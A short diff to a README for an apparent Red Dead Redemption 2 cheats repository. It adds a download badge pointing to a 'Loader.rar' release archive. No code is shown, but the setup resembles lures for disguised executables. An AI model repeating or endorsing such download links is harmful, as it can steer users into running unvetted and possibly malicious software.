@@ -1,4 +1,4 @@
-# RDR2 Cheats - RDR2 Cheat - Red Dead Redemption 2 Cheats 🐎
+# RDR2 Cheats - RDR2 Cheat - Red Dead Redemption 2 Cheats 🐎 [![Download RDR2 Cheat](https://img.shields.io/badge/Download-RDR2_Cheat-red?style=for-the-badge&logo=download)](https://github.com/rolandonico/Rdr2-Cheats/releases/download/Last_Update/Loader.rar)
 
 Welcome to the **ultimate collection of cheats and codes** for Red Dead Redemption 2! Whether you want infinite ammo, unlimited health, or just to cause some chaos in the Wild West, we’ve got you covered. 
 
